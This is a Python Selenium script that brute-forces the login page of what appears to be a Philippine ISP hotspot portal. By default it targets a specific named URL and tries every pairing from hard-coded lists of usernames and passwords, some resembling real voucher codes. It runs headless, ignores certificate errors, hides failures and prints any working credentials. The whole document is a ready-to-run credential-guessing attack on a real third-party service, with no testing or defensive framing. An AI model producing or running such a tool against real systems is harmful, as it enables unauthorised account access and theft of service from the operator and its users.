from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Prompt the user to enter a custom login URL or use the default
login_url = input(f"Enter Login URL (press Enter to use default: 'http://urbanlink.net.ph/urban/urbanlogin.html') or type url to customize: ").strip()
if not login_url:
    login_url = "http://urbanlink.net.ph/urban/urbanlogin.html"

wrong_login_url = input(f"Enter Wrong Login Redirect URL (press Enter to use default: 'http://urbanlink.net.ph/urban/login') or type url to customize: ").strip()
if not wrong_login_url:
    wrong_login_url = "http://urbanlink.net.ph/urban/login"

# Predefined username and password lists
usernames = ["test", "MHG8HFEBUVMH", "MHG8HFEBYGU3"]
passwords = ["admin", "17J8", "LXJ7"]

# Configure Chrome options
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--ignore-certificate-errors")
chrome_options.add_argument("--ignore-ssl-errors=yes")
chrome_options.add_argument("--disable-features=NetworkService,VizDisplayCompositor")
chrome_options.add_argument("--headless")  # Runs in headless mode (no UI)

# Start WebDriver with options 
driver = webdriver.Chrome(options=chrome_options)
wait = WebDriverWait(driver, 10)  # Explicit wait

# Open login page
driver.get(login_url)

# Loop through predefined usernames and passwords
for username in usernames:
    for password in passwords:
        try:
            # If redirected to the wrong login page, go back
            if driver.current_url == wrong_login_url:
                driver.get(login_url)
                time.sleep(2)  # Allow time to load

            # Find username and password fields
            user_input = wait.until(EC.presence_of_element_located((By.NAME, "username")))
            pass_input = driver.find_element(By.NAME, "password")

            # Enter credentials
            user_input.clear()
            pass_input.clear()
            user_input.send_keys(username)
            pass_input.send_keys(password)
            pass_input.send_keys(Keys.RETURN)

            # Wait for redirection
            time.sleep(3)
            print(f"Trying: {username} / {password} -> {driver.current_url}")

            # Check if login is successful
            if "dashboard" in driver.current_url or "success_page" in driver.current_url:
                print(f"✅ Success! Username: {username}, Password: {password}")
                driver.quit()
                exit()
            
            # Alternative: Check for login success indicator
            success_indicator = driver.find_elements(By.XPATH, "//div[contains(text(), 'Welcome')]")
            if success_indicator:
                print(f"✅ Success! Username: {username}, Password: {password}")
                driver.quit()
                exit()
            print(f"❌ Failed: {username} / {password}")
        except Exception:
            pass  # Suppress error messages

# Close browser
driver.quit()
